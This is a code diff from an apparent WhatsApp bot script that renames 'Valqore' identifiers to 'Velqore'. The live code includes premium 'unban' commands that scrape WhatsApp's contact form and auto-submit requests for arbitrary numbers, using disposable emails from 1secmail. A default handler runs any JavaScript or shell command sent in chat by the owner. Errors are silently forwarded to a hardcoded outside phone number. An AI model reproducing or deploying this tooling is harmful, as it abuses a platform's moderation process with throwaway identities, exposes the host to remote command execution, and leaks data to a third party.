 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9553,7 +9549,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9575,21 +9571,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'unbanv3': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9597,7 +9593,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9619,21 +9615,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'unbanv4': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9641,7 +9637,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9663,21 +9659,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'unbanv5': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9685,7 +9681,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9707,43 +9703,43 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 
             default:
                 if (budy.startsWith('=>')) {
-                    if (!ValqoreTheCreator) return ValqoreStickOwner()
+                    if (!VelqoreTheCreator) return VelqoreStickOwner()
                     function Return(sul) {
                         sat = JSON.stringify(sul, null, 2)
                         bang = util.format(sat)
                         if (sat == undefined) {
                             bang = util.format(sul)
                         }
-                        return replygcValqore(bang)
+                        return replygcVelqore(bang)
                     }
                     try {
-                        replygcValqore(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+                        replygcVelqore(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                     } catch (e) {
-                        replygcValqore(String(e))
+                        replygcVelqore(String(e))
                     }
                 }
 
                 if (budy.startsWith('>')) {
-                    if (!ValqoreTheCreator) return ValqoreStickOwner()
+                    if (!VelqoreTheCreator) return VelqoreStickOwner()
                     try {
                         let evaled = await eval(budy.slice(2))
                         if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-                        await replygcValqore(evaled)
+                        await replygcVelqore(evaled)
                     } catch (err) {
-                        await replygcValqore(String(err))
+                        await replygcVelqore(String(err))
                     }
                 }
                 if (budy.startsWith('$')) {
-                    if (!ValqoreTheCreator) return ValqoreStickOwner()
+                    if (!VelqoreTheCreator) return VelqoreStickOwner()
                     exec(budy.slice(2), (err, stdout) => {
-                        if (err) return replygcValqore(err)
-                        if (stdout) return replygcValqore(stdout)
+                        if (err) return replygcVelqore(err)
+                        if (stdout) return replygcVelqore(stdout)
                     })
                 }
                 if (isCmd && budy.toLowerCase() != undefined) {
@@ -9751,13 +9747,13 @@ if (m.chat.endsWith('broadcast')) return
 if (m.isBaileys) return
 let msgs = global.db.data.database
 if (!(budy.toLowerCase() in msgs)) return
-ValqoreInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
+VelqoreInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m}) 
 }
             }
     } catch (err) {
         console.log(util.format(err))
         let e = String(err)
-ValqoreInc.sendMessage("918130784851@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+VelqoreInc.sendMessage("918130784851@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
